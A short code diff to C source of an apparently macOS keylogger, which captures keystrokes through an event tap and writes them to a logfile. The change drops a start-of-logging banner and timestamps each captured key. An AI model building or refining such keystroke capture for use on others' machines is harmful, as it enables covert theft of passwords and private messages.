@@ -41,10 +41,6 @@ int main(int argc, const char *argv[]) {
         exit(1);
     }
 
-    // Output to logfile.
-    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
-    fflush(logfile);
-
     // Display the location of the logfile and start the loop.
     printf("Logging to: %s\n", logfileLocation);
     fflush(stdout);
@@ -61,7 +57,7 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
     // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    fprintf(logfile, "%lu : %s\n", (unsigned long) time(NULL), convertKeyCode(keyCode));
     fflush(logfile);
 
     return event;
